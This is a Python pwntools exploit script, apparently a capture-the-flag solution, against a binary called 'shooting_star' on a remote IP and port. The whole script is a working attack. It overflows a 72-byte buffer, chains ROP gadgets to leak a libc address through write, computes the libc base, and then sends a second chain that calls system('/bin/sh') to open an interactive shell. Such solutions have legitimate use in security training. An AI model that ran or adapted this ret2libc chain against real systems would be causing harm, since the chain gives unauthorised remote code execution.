#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./shooting_star_patched',checksec=False)
libc = ELF('./libc.so.6')

#p = process()
p = remote('94.237.59.180',54137)

pop_rdi =0x00000000004012cb
pop_rsi_r15 =0x00000000004012c9
payload = b'a'*72 
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(0x404018) + p64(0)
payload += p64(exe.sym.write)
payload += p64(exe.sym.main)
p.sendlineafter(b'> ',b'1')
p.sendafter(b'>> ',payload)
p.recvuntil(b'true!')
p.recvline()

leak = u64(p.recv(6).ljust(8,b'\x00'))
print(hex(leak))
libc.address =leak - 0x110210
log.info(f'libc {hex(libc.address)}')
#gdb.attach(p,gdbscript='''
#           b*0x00000000004011EC
#           ''')
input()
payload2 = b'a'*72
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b'/bin/sh\x00')))
payload2 += p64(libc.sym.system)
p.sendlineafter(b'> ',b'1')
p.sendafter(b'>> ',payload2)
p.interactive()
